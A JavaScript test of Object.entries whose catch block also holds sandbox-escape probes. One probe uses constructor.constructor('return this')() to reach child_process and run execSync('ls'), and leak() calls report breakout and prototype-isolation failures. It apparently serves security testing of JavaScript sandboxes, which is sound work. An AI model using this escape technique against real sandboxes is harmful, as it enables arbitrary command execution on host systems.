try {
    var F = function G() {
    };
    F.prototype.a = {};
    F.prototype.b = {};
    var f = new F();
    f.b = {};
    f.c = {};
    var result = Object.entries(f);
    assert.sameValue(Array.isArray(result), true, 'result is an array');
    assert.sameValue(result.length, 2, 'result has 2 items');
    assert.sameValue(Array.isArray(result[0]), true, 'first entry is an array');
    assert.sameValue(Array.isArray(result[1]), true, 'second entry is an array');
    assert.sameValue(result[0][0], 'b', 'first entry has key "b"');
    assert.sameValue(result[0][1], f.b, 'first entry has value f.b');
    assert.sameValue(result[1][0], 'c', 'second entry has key "c"');
    assert.sameValue(result[1][1], f.c, 'second entry has value f.c');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}